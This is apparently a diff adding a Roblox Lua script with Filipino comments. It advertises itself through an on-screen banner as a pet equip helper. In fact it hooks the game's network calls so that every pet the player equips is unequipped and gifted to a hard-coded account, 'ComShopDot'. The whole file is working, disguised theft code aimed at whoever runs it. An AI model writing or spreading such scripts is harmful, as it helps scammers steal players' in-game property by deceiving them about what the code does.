@@ -1,0 +1,66 @@
+--// Auto Unequip + Gift On EquipPet
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- Remote references
+local PetsService = ReplicatedStorage.GameEvents:WaitForChild("PetsService")
+local PetGiftingService = ReplicatedStorage.GameEvents:WaitForChild("PetGiftingService")
+
+-- Target (ikaw)
+local targetName = "ComShopDot"
+
+--// Instruction GUI (idadagdag lang, walang papalitan)
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PetInstructionGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(0.6, 0, 0.08, 0)
+textLabel.Position = UDim2.new(0.2, 0, 0.05, 0)
+textLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+textLabel.TextScaled = true
+textLabel.Font = Enum.Font.FredokaOne
+textLabel.Text = "⚡ Best pet equip and unequip in your farm"
+textLabel.Parent = screenGui
+textLabel.ZIndex = 10
+textLabel.BackgroundTransparency = 0.3
+textLabel.TextStrokeTransparency = 0.2
+textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+
+-- Hook EquipPet
+local old; old = hookmetamethod(game, "__namecall", function(self, ...)
+    local method = getnamecallmethod()
+    local args = {...}
+
+    if self == PetsService and method == "FireServer" then
+        if args[1] == "EquipPet" and typeof(args[2]) == "string" then
+            local petId = args[2]
+            warn("🐾 Na-detect equip:", petId)
+
+            -- Auto unequip agad
+            PetsService:FireServer("UnequipPet", petId)
+            warn("❌ Unequipped pet:", petId)
+
+            -- Gift papunta kay ComShopDot
+            task.wait(0.1)
+            PetGiftingService:FireServer("GivePet", Players[targetName])
+            task.wait(0.1)
+            PetGiftingService:FireServer(true, petId, targetName)
+
+            warn("🎁 Pet sent to:", targetName, "| PetID:", petId)
+
+            -- Update instruction text temporarily
+            textLabel.Text = "🎁 Pet (".. petId ..") gifted to ".. targetName .. "!"
+            task.delay(4, function()
+                textLabel.Text = "⚡ Put pets  in your farm"
+            end)
+        end
+    end
+
+    return old(self, ...)
+end)
+
+warn("✅ Auto Unequip + Gift On Equip loaded. Lahat ng equip -> auto unequip + send kay " .. targetName)
